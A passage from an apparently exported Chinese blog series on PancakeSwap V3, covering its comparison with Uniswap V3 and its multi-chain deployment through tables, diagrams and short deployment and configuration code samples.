Chain、Ethereum、Aptos等Ethereum、Arbitrum、Optimism等治理代币CAKEUNI开发者PancakeSwap团队Uniswap Labs开源程度完全开源完全开源代码基础Fork自Uniswap V3原创实现\n1.2 发展历程对比\ntimeline\n    title PancakeSwap V3 vs Uniswap V3 发展历程\n    section Uniswap V3\n        2021年5月 : V3在Ethereum主网发布\n        2021年12月 : 扩展到Arbitrum\n        2022年3月  : 扩展到Optimism\n        2022年12月 : 扩展到Polygon\n        2023年     : 持续优化和更新\n    section PancakeSwap V3\n        2023年4月 : V3在BNB Chain发布\n        2023年6月 : 扩展到Ethereum\n        2023年9月 : 扩展到Aptos\n        2024年     : 持续多链扩展\n\n\n2. 技术架构对比\n2.1 核心机制对比\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n机制PancakeSwap V3Uniswap V3说明集中流动性✅✅完全相同的实现Tick机制✅✅price = 1.0001^tickNFT LP Token✅✅ERC721标准虚拟储备✅✅相同的数学模型费用系统✅✅费率选择略有差异\n2.2 费率结构对比\ngraph LR\n    subgraph PancakeSwapV3[&quot;PancakeSwap V3 费率&quot;]\n        P1[&quot;0.01% - Tick间距 1&quot;]\n        P2[&quot;0.05% - Tick间距 10&quot;]\n        P3[&quot;0.25% - Tick间距 50&quot;]\n        P4[&quot;1.00% - Tick间距 200&quot;]\n    end\n\n    subgraph UniswapV3[&quot;Uniswap V3 费率&quot;]\n        U1[&quot;0.01% - Tick间距 1&quot;]\n        U2[&quot;0.05% - Tick间距 10&quot;]\n        U3[&quot;0.30% - Tick间距 60&quot;]\n        U4[&quot;1.00% - Tick间距 200&quot;]\n    end\n\n    P3 -.-&gt;|&quot;PancakeSwap独有&quot;| U3\n\n    style P3 fill:#ffeb3b\n    style U3 fill:#e3f2fd\n\n费率差异分析：\ngraph TB\n    subgraph PancakeSwap[&quot;PancakeSwap 0.25%费率&quot;]\n        P1[&quot;Tick间距50&lt;br/&gt;更细的精度&quot;]\n        P2[&quot;更适合&lt;br/&gt;主流币对&quot;]\n        P3[&quot;降低LP&lt;br/&gt;滑点损失&quot;]\n        P4[&quot;提高&lt;br/&gt;交易效率&quot;]\n    end\n\n    subgraph Uniswap[&quot;Uniswap 0.30%费率&quot;]\n        U1[&quot;Tick间距60&lt;br/&gt;稍粗的精度&quot;]\n        U2[&quot;标准主流&lt;br/&gt;币对选择&quot;]\n        U3[&quot;稍高的&lt;br/&gt;LP成本&quot;]\n        U4[&quot;稍低的&lt;br/&gt;交易效率&quot;]\n    end\n\n    PancakeSwap --&gt;|优势| Uniswap\n\n    style PancakeSwap fill:#ffeb3b\n\n2.3 代码优化对比\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n优化项PancakeSwap V3Uniswap V3Gas优化针对BNB Chain优化针对Ethereum优化存储优化改进的存储布局标准存储布局库函数优化的数学运算标准数学运算重入保护改进的锁机制标准锁机制\n\n3. Gas成本对比\n3.1 操作成本对比（Ethereum主网）\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n操作PancakeSwap V3Uniswap V3差异Swap~60,000 gas~65,000 gasPancakeSwap约低8%Mint流动性~180,000 gas~200,000 gasPancakeSwap约低10%Burn流动性~120,000 gas~130,000 gasPancakeSwap约低8%Collect费用~30,000 gas~35,000 gasPancakeSwap约低14%\n3.2 多链Gas对比\ngraph TB\n    subgraph BNBChain[&quot;BNB Chain (PancakeSwap优势)&quot;]\n        B1[&quot;Swap: ~0.05-0.5 USD&quot;]\n        B2[&quot;Mint: ~0.2-1.5 USD&quot;]\n        B3[&quot;Burn: ~0.1-1.0 USD&quot;]\n    end\n\n    subgraph Ethereum[&quot;Ethereum (两种类似)&quot;]\n        E1[&quot;Swap: ~5-30 USD&quot;]\n        E2[&quot;Mint: ~15-80 USD&quot;]\n        E3[&quot;Burn: ~10-50 USD&quot;]\n    end\n\n    B1 --&gt;|&quot;60-200x便宜&quot;| E1\n\n    style BNBChain fill:#ffeb3b\n    style Ethereum fill:#ffcdd2\n\n3.3 Gas优化策略\nmindmap\n  root((PancakeSwap V3&lt;br/&gt;Gas优化))\n    存储优化\n      紧凑数据结构\n      Slot0打包\n      映射优化\n    计算优化\n      位运算\n      预计算\n      内联函数\n    操作优化\n      批量操作\n      简化事件\n      减少状态读写\n    BNB Chain优势\n      低基础gas\n      快速确认\n      大区块\n\n\n4. 流动性深度对比\n4.1 TVL对比（截至2024年初）\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n链PancakeSwap V3Uniswap V3TVL占比BNB Chain~$500M-PancakeSwap主导Ethereum~$50M~$3BUniswap主导Arbitrum-~$600MUniswap主导Optimism-~$200MUniswap主导\n4.2 交易量对比\ngraph LR\n    subgraph PancakeSwap[&quot;PancakeSwap V3 交易量&quot;]\n        P1[&quot;BNB Chain&lt;br/&gt;~$500M/天&quot;]\n        P2[&quot;Ethereum&lt;br/&gt;~$20M/天&quot;]\n    end\n\n    subgraph Uniswap[&quot;Uniswap V3 交易量&quot;]\n        U1[&quot;Ethereum&lt;br/&gt;~$1.5B/天&quot;]\n        U2[&quot;Arbitrum&lt;br/&gt;~$300M/天&quot;]\n        U3[&quot;Optimism&lt;br/&gt;~$100M/天&quot;]\n    end\n\n    P1 --&gt;|&quot;BNB Chain主导&quot;| U2\n    U1 --&gt;|&quot;Ethereum主导&quot;| P2\n\n    style PancakeSwap fill:#ffeb3b\n    style Uniswap fill:#e3f2fd\n\n\n5. 生态系统对比\n5.1 PancakeSwap生态整合\nmindmap\n  root((PancakeSwap V3&lt;br/&gt;生态整合))\n    农场Farm\n      V3流动性池\n      自动复投\n      CAKE奖励\n    IFO\n      V3池参与\n      新币发行\n      社区投票\n    Syrup\n      CAKE质押\n      收益分配\n      治理权重\n    Lottery\n      CAKE使用\n      资金池\n      彩票机制\n    NFT市场\n      团队头像\n      特权卡\n      收藏品\n\n5.2 Uniswap生态特点\nmindmap\n  root((Uniswap V3&lt;br/&gt;生态特点))\n    DeFi集成\n      Aave借贷\n      Compound借贷\n      Yearn收益\n    Layer2支持\n      Arbitrum\n      Optimism\n      Polygon\n    机构采用\n      大部分DeFi协议\n      CEX集成\n      传统金融\n    工具生态\n      Dune Analytics\n      DeFi Llama\n      聚合器\n\n5.3 生态对比总结\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n方面PancakeSwap V3Uniswap V3农场激励✅ 深度整合❌ 不支持IFO机制✅ 支持❌ 不支持治理投票✅ CAKE投票✅ UNI投票跨链桥✅ 支持❌ 不支持机构集成中等高开发工具较少丰富\n\n6. 治理机制对比\n6.1 治理代币对比\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n特性CAKE (PancakeSwap)UNI (Uniswap)总供应量~750M~1B当前流通~250M~600M治理权重1 CAKE = 1票1 UNI = 1票提案门槛2.5M CAKE10M UNI投票门槛1M CAKE40M UNI费用分配可调整固定\n6.2 治理灵活性对比\ngraph LR\n    subgraph PancakeSwap[&quot;PancakeSwap 治理&quot;]\n        P1[&quot;社区提案&lt;br/&gt;门槛较低&quot;]\n        P2[&quot;快速决策&lt;br/&gt;适应市场&quot;]\n        P3[&quot;费用分配&lt;br/&gt;可调整&quot;]\n        P4[&quot;多链参数&lt;br/&gt;独立配置&quot;]\n    end\n\n    subgraph Uniswap[&quot;Uniswap 治理&quot;]\n        U1[&quot;提案门槛&lt;br/&gt;相对较高&quot;]\n        U2[&quot;决策周期&lt;br/&gt;较长&quot;]\n        U3[&quot;费用分配&lt;br/&gt;相对固定&quot;]\n        U4[&quot;标准参数&lt;br/&gt;统一配置&quot;]\n    end\n\n    P1 --&gt;|&quot;更灵活&quot;| U1\n    P3 --&gt;|&quot;可调整&quot;| U3\n\n    style PancakeSwap fill:#ffeb3b\n\n\n7. 安全与审计对比\n7.1 审计情况\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n方面PancakeSwap V3Uniswap V3审计机构CertiK、SlowMist、PeckShield等Trail of Bits、OpenZeppelin等审计次数3-4次5-6次漏洞赏金活跃活跃安全事件少量极少\n7.2 安全机制对比\ngraph TB\n    subgraph PancakeSwap[&quot;PancakeSwap 安全&quot;]\n        P1[&quot;多机构审计&quot;]\n        P2[&quot;漏洞赏金计划&quot;]\n        P3[&quot;时间锁机制&quot;]\n        P4[&quot;多重签名&quot;]\n    end\n\n    subgraph Uniswap[&quot;Uniswap 安全&quot;]\n        U1[&quot;顶级审计机构&quot;]\n        U2[&quot;长期测试&quot;]\n        U3[&quot;社区审查&quot;]\n        U4[&quot;机构背书&quot;]\n    end\n\n    PancakeSwap --&gt;|同样重视| Uniswap\n\n    style PancakeSwap fill:#ffeb3b\n    style Uniswap fill:#e3f2fd\n\n\n8. 开发体验对比\n8.1 SDK与文档\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n方面PancakeSwap V3Uniswap V3SDK支持PancakeSwap SDK@uniswap/sdk-core文档完善度良好非常完善社区支持活跃非常活跃示例代码较少丰富集成难度中等低\n8.2 多链部署\ngraph LR\n    subgraph PancakeSwap[&quot;PancakeSwap V3&quot;]\n        P1[BNB Chain&lt;br/&gt;主阵地]\n        P2[Ethereum&lt;br/&gt;扩展]\n        P3[Aptos&lt;br/&gt;探索]\n        P4[更多链&lt;br/&gt;计划中]\n    end\n\n    subgraph Uniswap[&quot;Uniswap V3&quot;]\n        U1[Ethereum&lt;br/&gt;主阵地]\n        U2[Arbitrum&lt;br/&gt;成熟]\n        U3[Optimism&lt;br/&gt;成熟]\n        U4[Polygon&lt;br/&gt;成熟]\n    end\n\n    P1 --&gt;|&quot;BNB Chain主导&quot;| U4\n    U1 --&gt;|&quot;Ethereum主导&quot;| P2\n\n    style PancakeSwap fill:#ffeb3b\n    style Uniswap fill:#e3f2fd\n\n\n9. 适用场景选择\n9.1 选择PancakeSwap V3的场景\nmindmap\n  root((选择PancakeSwap V3))\n    交易在BNB Chain\n      低gas需求\n      快速确认\n      BSC生态\n    参与农场激励\n      V3农场池\n      CAKE奖励\n      自动复投\n    参与IFO\n      新币发行\n      社区投票\n      早期参与\n    社区治理\n      CAKE持有\n      参与决策\n      影响发展\n    成本敏感\n      低交易成本\n      频繁操作\n      小额交易\n\n9.2 选择Uniswap V3的场景\nmindmap\n  root((选择Uniswap V3))\n    Ethereum主网交易\n      最大流动性\n      深度市场\n      机构应用\n    Layer2交易\n      Arbitrum\n      Optimism\n      Polygon\n    标准化需求\n      DeFi协议集成\n      CEX集成\n      传统金融\n    最大兼容性\n      工具生态\n      数据分析\n      聚合器支持\n    机构级应用\n      高安全性\n      长期稳定\n      合规考虑\n\n9.3 决策流程\nflowchart TD\n    A[开始选择] --&gt; B{目标链?}\n\n    B --&gt;|BNB Chain| C[PancakeSwap V3]\n    B --&gt;|Ethereum| D{优先考虑?}\n\n    D --&gt;|Gas成本| E{V3已部署?}\n    D --&gt;|流动性深度| F[Uniswap V3]\n    D --&gt;|生态整合| G{需要农场?}\n    D --&gt;|标准化| F\n\n    E --&gt;|是| C\n    E --&gt;|否| F\n\n    G --&gt;|是| C\n    G --&gt;|否| F\n\n    style C fill:#ffeb3b\n    style F fill:#e3f2fd\n\n\n10. 未来发展对比\n10.1 PancakeSwap V3发展路线\ntimeline\n    title PancakeSwap V3 未来发展\n        2024 Q1 : 优化Gas效率\n        2024 Q2 : 扩展更多链\n        2024 Q3 : 新功能开发\n        2024 Q4 : 社区治理升级\n        2025   : 持续创新和优化\n\n10.2 Uniswap V4展望\ntimeline\n    title Uniswap V4 展望\n        2024 : V4开发中\n        2024+ : 新架构引入\n        2024+ : Hook机制\n        2024+ : 单一池架构\n        2024+ : Gas优化\n\n\n11. 本章小结\n11.1 对比总结\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n维度PancakeSwap V3优势Uniswap V3优势Gas成本BNB Chain极低Ethereum标准流动性BNB Chain主导Ethereum/L2主导生态整合农场、IFO深度整合DeFi标准化治理灵活性社区驱动机构背书开发工具基础完善非常完善多链支持快速扩展成熟稳定\n11.2 核心差异\nmindmap\n  root((核心差异))\n    PancakeSwap V3\n      BNB Chain生态\n      农场IFO整合\n      社区驱动\n      灵活治理\n      多链快速扩展\n    Uniswap V3\n      Ethereum/L2\n      DeFi标准\n      机构背书\n      稳定 governance\n      成熟工具生态\n\n\n下一篇预告\n在下一篇文章中，我们将深入探讨多链部署与特性适配，包括：\n\nPancakeSwap V3的多链架构\n不同链的适配策略\n跨链流动性管理\n未来多链发展\n\n\n参考资料\n\nPancakeSwap V3 官方文档\nUniswap V3 官方文档\nPancakeSwap vs Uniswap 对比分析\nDune Analytics - DEX对比\n"},"blockchainguide/DApp_Development/应用场景/defi/pancake/v3/08-多链部署与特性适配":{"slug":"blockchainguide/DApp_Development/应用场景/defi/pancake/v3/08-多链部署与特性适配","filePath":"blockchainguide/DApp_Development/应用场景/defi/pancake/v3/08-多链部署与特性适配.md","title":"08-多链部署与特性适配","links":[],"tags":[],"content":"死磕PancakeSwap V3（八）：多链部署与特性适配\n\n本文是「死磕PancakeSwap V3」系列的第八篇，深入探讨PancakeSwap V3的多链部署策略和特性适配。\n\n系列导航\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n序号标题核心内容01PancakeSwap V3概述发展历程、集中流动性、V3特色02Tick机制与价格数学Tick设计、价格转换算法03架构与合约设计Factory、Pool合约结构04交换机制深度解析swap函数、价格发现05流动性与头寸Position、mint/burn06费用系统与预言机费用分配、TWAP07V3与Uniswap V3对比差异点、优化、适用场景08多链部署与特性适配BNB Chain、Ethereum、跨链策略09集成开发指南SDK使用、交易构建、最佳实践10MEV与套利策略JIT、三明治攻击、防范策略\n\n1. 多链部署概述\n1.1 部署时间线\ntimeline\n    title PancakeSwap V3 多链部署历程\n    section BNB Chain\n        2023年4月 : V3在BNB Chain首发\n        2023年5月 : 主流池子上线\n        2023年6月 : 农场激励启动\n    section Ethereum\n        2023年6月 : V3在Ethereum部署\n        2023年7月 : 主要池子创建\n        2023年8月 : 社区推广\n    section Aptos\n        2023年9月 : 探索非EVM链\n        2023年10月 : Aptos版本测试\n        2024年     : 持续优化\n    section 未来\n        2024+     : 更多链部署计划\n        2024+     : 跨链桥整合\n\n1.2 已部署链概况\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n链部署时间状态TVL特点BNB Chain2023.04✅ 活跃~$500M主阵地，高TVLEthereum2023.06✅ 活跃~$50M扩展，竞争激烈Aptos2023.09⚠️ 测试~$5M非EVM探索\n\n2. BNB Chain部署详解\n2.1 BNB Chain优势\ngraph TB\n    subgraph BNBChainAdvantages[&quot;BNB Chain 优势&quot;]\n        A1[低Gas成本&lt;br/&gt;~0.05-0.5 USD/交易]\n        A2[快速确认&lt;br/&gt;~3秒区块]\n        A3[大区块大小&lt;br/&gt;~30M gas/区块]\n        A4[活跃社区&lt;br/&gt;庞大用户群]\n        A5[丰富生态&lt;br/&gt;DeFi、NFT、GameFi]\n    end\n\n    subgraph Impact[&quot;影响&quot;]\n        I1[高频交易可行]\n        I2[用户体验优秀]\n        I3[复杂操作成本低]\n        I4[高TVL潜力]\n        I5[跨链整合容易]\n    end\n\n    BNBChainAdvantages --&gt; Impact\n\n    style BNBChainAdvantages fill:#ffeb3b\n\n2.2 BNB Chain配置参数\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n参数值说明区块时间3秒快速确认区块Gas上限30,000,000大容量基础Gas价格3 gwei低成本交易Gas消耗~50,000-200,000Swap/Mint/Burn平均交易成本$0.05-0.5极低成本\n2.3 BNB Chain上的热门池子\ngraph LR\n    subgraph TopPools[&quot;BNB Chain 热门池子&quot;]\n        P1[CAKE/BNB&lt;br/&gt;0.25%]\n        P2[USDT/USDC&lt;br/&gt;0.01%]\n        P3[WBNB/USDT&lt;br/&gt;0.05%]\n        P4[ETH/BNB&lt;br/&gt;0.25%]\n        P5[BUSD/USDT&lt;br/&gt;0.01%]\n    end\n\n    subgraph Features[&quot;特点&quot;]\n        F1[高流动性]\n        F2[低费率]\n        F3[高交易量]\n        F4[稳定币对]\n        F5[跨链资产]\n    end\n\n    P1 --&gt; F1\n    P2 --&gt; F2\n    P3 --&gt; F3\n    P4 --&gt; F5\n    P5 --&gt; F4\n\n    style P1 fill:#ffeb3b\n    style P2 fill:#c8e6c9\n\n2.4 BNB Chain生态整合\nmindmap\n  root((BNB Chain整合))\n    农场\n      V3流动性池\n      CAKE奖励\n      自动复投\n    跨链桥\n      Binance Bridge\n      Celer Bridge\n      Multichain\n    稳定币\n      USDT\n      USDC\n      BUSD\n      DAI\n    DeFi协议\n      Venus\n      Alpaca\n      PancakeSwap Lending\n    NFT生态\n      PancakeSwap NFT\n      Binance NFT\n      Gallery\n\n\n3. Ethereum部署详解\n3.1 Ethereum挑战与对策\ngraph TB\n    subgraph Challenges[&quot;Ethereum 挑战&quot;]\n        C1[高Gas成本&lt;br/&gt;$5-50/交易]\n        C2[慢确认&lt;br/&gt;~12秒区块]\n        C3[小区块&lt;br/&gt;~15M gas]\n        C4[竞争激烈&lt;br/&gt;Uniswap主导]\n    end\n\n    subgraph Strategies[&quot;应对策略&quot;]\n        S1[Gas优化]\n        S2[聚合策略]\n        S3[差异化定位]\n        S4[用户教育]\n    end\n\n    Challenges --&gt; Strategies\n\n    style Strategies fill:#c8e6c9\n\n3.2 Ethereum优化策略\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n优化项PancakeSwap V3Uniswap V3说明Gas优化额外优化标准实现PancakeSwap更优批量操作支持支持两者类似价格查询优化实现标准实现PancakeSwap略优状态读写优化布局标准布局PancakeSwap更紧凑\n3.3 Ethereum上的热门池子\ngraph LR\n    subgraph EthPools[&quot;Ethereum 热门池子&quot;]\n        P1[WETH/USDC&lt;br/&gt;0.05%]\n        P2[USDT/USDC&lt;br/&gt;0.01%]\n        P3[WETH/USDT&lt;br/&gt;0.05%]\n        P4[DAI/USDC&lt;br/&gt;0.01%]\n    end\n\n    subgraph Competition[&quot;竞争环境&quot;]\n        C1[Uniswap V3&lt;br/&gt;主导地位]\n        C2[Curve&lt;br/&gt;稳定币]\n        C3[Balancer&lt;br/&gt;多资产]\n        C4[SushiSwap&lt;br/&gt;社区驱动]\n    end\n\n    P1 --&gt; C1\n    P2 --&gt; C2\n\n    style P1 fill:#e3f2fd\n    style P2 fill:#c8e6c9\n\n3.4 Ethereum差异化策略\nmindmap\n  root((Ethereum差异化))\n    成本优势\n      稍低的Gas\n      优化实现\n    用户群体\n      PancakeSwap社区\n      Binance用户\n      跨链用户\n    工具整合\n      Binance Wallet\n      Trust Wallet\n      第三方工具\n    激励措施\n      CAKE奖励\n      社区活动\n      营销推广\n\n\n4. Aptos探索（非EVM链）\n4.1 Aptos部署的意义\ngraph TB\n    subgraph Significance[&quot;Aptos部署意义&quot;]\n        S1[非EVM链探索]\n        S2[新技术栈验证]\n        S3[Move语言适配]\n        S4[高性能区块链]\n        S5[未来发展布局]\n    end\n\n    subgraph Benefits[&quot;潜在收益&quot;]\n        B1[技术多样性]\n        B2[风险分散]\n        B3[生态扩张]\n        B4[经验积累]\n    end\n\n    Significance --&gt; Benefits\n\n    style Significance fill:#ffeb3b\n\n4.2 Move语言适配挑战\ngraph LR\n    subgraph Solidity[&quot;Solidity&quot;]\n        S1[EVM兼容]\n        S2[成熟工具链]\n        S3[丰富库]\n    end\n\n    subgraph Move[&quot;Move&quot;]\n        M1[资源导向]\n        M2[安全设计]\n        M3[并行执行]\n    end\n\n    subgraph Adaptation[&quot;适配工作&quot;]\n        A1[重新实现核心逻辑]\n        A2[适配Move特性]\n        A3[测试验证]\n        A4[性能优化]\n    end\n\n    Solidity --&gt;|需要移植到| Move\n    Move --&gt; Adaptation\n\n    style Move fill:#e8f5e9\n\n4.3 Aptos特性适配\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n特性适配策略状态并行执行利用Move并行特性开发中资源模型适配资源管理开发中高性能优化吞吐量开发中低Gas充分利用成本优势开发中\n\n5. 跨链部署架构\n5.1 架构设计\ngraph TB\n    subgraph CrossChain[&quot;跨链架构&quot;]\n        Core[核心合约库]\n        BNB[BNB Chain部署]\n        ETH[Ethereum部署]\n        APT[Aptos部署]\n        Bridge[跨链桥]\n    end\n\n    subgraph Commonality[&quot;共同性&quot;]\n        C1[相同的核心逻辑]\n        C2[相同的数学模型]\n        C3[相同的接口设计]\n    end\n\n    subgraph Specificity[&quot;特殊性&quot;]\n        S1[链特定优化]\n        S2[不同Gas策略]\n        S3[不同参数配置]\n    end\n\n    Core --&gt; BNB\n    Core --&gt; ETH\n    Core --&gt; APT\n    Core --&gt; Commonality\n    BNB --&gt; Specificity\n    ETH --&gt; Specificity\n    APT --&gt; Specificity\n\n    style Core fill:#ffeb3b\n\n5.2 链特定配置\ngraph LR\n    subgraph Configurations[&quot;链配置&quot;]\n        BNB[BNB Chain&lt;br/&gt;tickSpacing: 1/10/50/200]\n        ETH[Ethereum&lt;br/&gt;tickSpacing: 1/10/50/200]\n        APT[Aptos&lt;br/&gt;待定]\n    end\n\n    subgraph GasConfig[&quot;Gas配置&quot;]\n        GB[BNB: 优化低成本]\n        GE[Ethereum: 标准优化]\n        GA[Aptos: 极低成本]\n    end\n\n    Configurations --&gt; GasConfig\n\n    style BNB fill:#ffeb3b\n    style ETH fill:#e3f2fd\n    style APT fill:#c8e6c9\n\n\n6. 跨链流动性管理\n6.1 跨链流动性挑战\ngraph TB\n    subgraph Challenges[&quot;挑战&quot;]\n        C1[流动性分散]\n        C2[价格不一致]\n        C3[套利复杂性]\n        C4[桥接风险]\n    end\n\n    subgraph Solutions[&quot;解决方案&quot;]\n        S1[流动性激励]\n        S2[价格预言机]\n        S3[套利机器人]\n        S4[安全桥接]\n    end\n\n    Challenges --&gt; Solutions\n\n    style Solutions fill:#c8e6c9\n\n6.2 跨链套利策略\nsequenceDiagram\n    participant A as 套利者\n    participant B as BNB Chain V3\n    participant Bridge as 跨链桥\n    participant E as Ethereum V3\n\n    A-&gt;&gt;B: 检测价差\n    B--&gt;&gt;A: 价格信息\n    A-&gt;&gt;E: 检测价格\n    E--&gt;&gt;A: 价格信息\n    A-&gt;&gt;A: 计算套利利润\n    A-&gt;&gt;B: 执行Swap\n    A-&gt;&gt;Bridge: 跨链转移\n    Bridge-&gt;&gt;E: 接收资产\n    A-&gt;&gt;E: 执行反向Swap\n    E--&gt;&gt;Bridge: 利润\n    Bridge--&gt;&gt;A: 返回利润\n\n6.3 跨链流动性激励\nmindmap\n  root((跨链激励策略))\n    CAKE奖励\n      多链CAKE\n      跨链桥接\n      统一奖励\n    费用分成\n      链特定费用\n      协议费用\n      激励分配\n    活跃度奖励\n      早期用户\n      高频交易\n      流动性提供\n    社区参与\n      治理投票\n      提案建议\n      生态贡献\n\n\n7. 多链部署的技术实现\n7.1 部署流程\nflowchart TD\n    A[准备阶段] --&gt; B[代码审计]\n    B --&gt; C[链上测试]\n    C --&gt; D[参数配置]\n    D --&gt; E[合约部署]\n    E --&gt; F[初始流动性]\n    F --&gt; G[验证测试]\n    G --&gt; H[激励启动]\n    H --&gt; I[监控调优]\n\n    style A fill:#ffeb3b\n    style I fill:#c8e6c9\n\n7.2 部署脚本示例\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n \nimport &quot;@openzeppelin/contracts/proxy/transparent/TransparentUpgradeableProxy.sol&quot;;\nimport &quot;../PancakeV3Factory.sol&quot;;\n \ncontract DeployScript {\n    function deploy(\n        address implementation,\n        address admin,\n        bytes calldata initData\n    ) external returns (address) {\n        // 部署代理合约\n        TransparentUpgradeableProxy proxy =\n            new TransparentUpgradeableProxy(\n                implementation,\n                admin,\n                initData\n            );\n \n        return address(proxy);\n    }\n}\n7.3 多链配置管理\n// 示例：多链配置对象\nconst chainConfigs = {\n    56: {  // BNB Chain\n        factoryAddress: &quot;0x...&quot;,\n        routerAddress: &quot;0x...&quot;,\n        feeAmountTickSpacing: {\n            100: 1,    // 0.01%\n            500: 10,   // 0.05%\n            2500: 50,  // 0.25%\n            10000: 200 // 1.00%\n        }\n    },\n    1: {  // Ethereum\n        factoryAddress: &quot;0x...&quot;,\n        routerAddress: &quot;0x...&quot;,\n        feeAmountTickSpacing: {\n            100: 1,\n            500: 10,\n            2500: 50,\n            10000: 200\n        }\n    }\n};\n\n8. 未来多链规划\n8.1 计划部署的链\ngraph LR\n    subgraph Planned[&quot;计划部署&quot;]\n        P1[Arbitrum&lt;br/&gt;2024 Q2]\n        P2[Optimism&lt;br/&gt;2024 Q3]\n        P3[Polygon&lt;br/&gt;2024 Q4]\n        P4[Solana&lt;br/&gt;探索中]\n        P5[Base&lt;br/&gt;探索中]\n    end\n\n    subgraph Criteria[&quot;选择标准&quot;]\n        C1[用户规模]\n        C2[DeFi活跃度]\n        C3[技术可行性]\n        C4[生态互补性]\n    end\n\n    Planned --&gt; Criteria\n\n    style Planned fill:#ffeb3b\n\n8.2 多链发展策略\nmindmap\n  root((多链发展策略))\n    优先级排序\n      用户规模\n      DeFi生态\n      技术准备度\n    分阶段部署\n      主链先行\n      扩展跟进\n      持续优化\n    资源分配\n      开发资源\n      营销预算\n      社区建设\n    风险管理\n      安全审计\n      小步快跑\n      快速响应\n\n\n9. 多链部署的挑战与解决方案\n9.1 主要挑战\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n挑战说明解决方案流动性分散多链导致流动性分散跨链激励、桥接优化维护成本多链维护复杂度高自动化工具、统一管理安全问题多链增加攻击面多重审计、漏洞赏金用户体验跨链操作复杂统一界面、简化流程成本控制多链部署成本高智能合约优化、Gas策略\n9.2 最佳实践\nmindmap\n  root((多链最佳实践))\n    技术层面\n      核心逻辑统一\n      链特定优化\n      自动化部署\n      统一监控\n    运营层面\n      社区建设\n      用户教育\n      激励机制\n      反馈收集\n    安全层面\n      多重审计\n      漏洞赏金\n      应急响应\n      风险管理\n    产品层面\n      用户体验\n      跨链工具\n      文档完善\n      支持体系\n\n\n10. 本章小结\n10.1 多链部署核心要点\nmindmap\n  root((多链部署要点))\n    BNB Chain\n      主阵地\n      高TVL\n      低成本\n    Ethereum\n      战略扩展\n      竞争激烈\n      差异化\n    Aptos\n      非EVM探索\n      技术创新\n      未来布局\n    跨链管理\n      流动性整合\n      套利策略\n      激励机制\n    未来规划\n      更多链\n      技术优化\n      生态扩张\n\n10.2 关键数据\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n指标BNB ChainEthereumAptosTVL~$500M~$50M~$5M日交易量~$500M~$20M~$1M池子数量500+100+20+活跃用户100K+10K+1K+\n\n下一篇预告\n在下一篇文章中，我们将深入探讨集成开发指南，包括：\n\nPancakeSwap V3 SDK使用\n交易构建与执行\n最佳开发实践\n常见问题解决\n\n\n参考资料\n\nPancakeSwap V3 多链部署\nBNB Chain 官方文档\nEthereum 官方文档\nAptos 官方文档\n"},"blockchainguide/DApp_Development/应用场景/defi/pancake/v3/README":{"slug":"blockchainguide/DApp_Development/应用场景/defi/pancake/v3/README","filePath":"blockchainguide/DApp_Development/应用场景/defi/pancake/v3/README.md","title":"README","links":["blockchainguide/DApp_Development/应用场景/defi/pancake/v3/01-PancakeSwap-V3概述","02-Tick机制与价格数学","03-架构与合约设计","04-交换机制深度解析","05-流动性管理与头寸","06-费用系统与预言机","blockchainguide/DApp_Development/应用场景/defi/pancake/v3/07-V3与Uniswap-V3对比","blockchainguide/DApp_Development/应用场景/defi/pancake/v3/08-多链部署与特性适配","09-集成开发指南","10-MEV与套利策略"],"tags":[],"content":"死磕PancakeSwap V3 系列文章\n\n深入剖析PancakeSwap V3的核心机制、独特优势与实现原理\n\n系列概述\n本系列共10篇文章，从基础概念到高级实战，全面解析PancakeSwap V3的设计实现，特别关注其与Uniswap V3的差异及多链部署特性。\nflowchart LR\n    subgraph 基础篇[&quot;基础篇 (1-3)&quot;]\n        A1[01-PancakeSwap V3概述]\n        A2[02-Tick机制与价格数学]\n        A3[03-架构与合约设计]\n    end\n\n    subgraph 核心篇[&quot;核心篇 (4-6)&quot;]\n        B1[04-交换机制深度解析]\n        B2[05-流动性管理与头寸]\n        B3[06-费用系统与预言机]\n    end\n\n    subgraph 特色篇[&quot;特色篇 (7-8)&quot;]\n        C1[07-V3与Uniswap V3对比]\n        C2[08-多链部署与特性适配]\n    end\n\n    subgraph 实践篇[&quot;实践篇 (9-10)&quot;]\n        D1[09-集成开发指南]\n        D2[10-MEV与套利策略]\n    end\n\n    基础篇 --&gt; 